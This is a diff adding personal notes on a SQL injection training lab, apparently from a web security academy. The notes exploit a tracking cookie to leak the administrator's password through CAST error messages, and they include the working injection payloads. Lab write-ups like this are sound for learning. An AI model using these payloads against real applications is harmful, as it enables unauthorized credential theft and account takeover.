@@ -1,0 +1,33 @@
+This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.
+
+The database contains a different table called users, with columns called username and password. To solve the lab, find a way to leak the password for the administrator user, then log in to their account.
+
+putting ' after the trackingId returns a 500 error
+
+along with the error:
+Unterminated string literal started at position 52 in SQL SELECT * FROM 
+tracking WHERE id = 'zTbNSsTUNG3pf08I''. Expected  char
+
+
+putting '-- after the trackingId returns a 200 response code
+
+
+
+
+
+Take out the trackingId to allow for more space for the query:
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+
+
+
+
+This leaks the 1st username input into the database, in this case it is administrator
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+Therefore we can modify the query to leak the password of the first user using:
+' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+using the cast function throws an error, this is what we want as the database
+will then output the error onto the screen. Leaking the password as the password
+which is a string will not CAST to an INT correctly
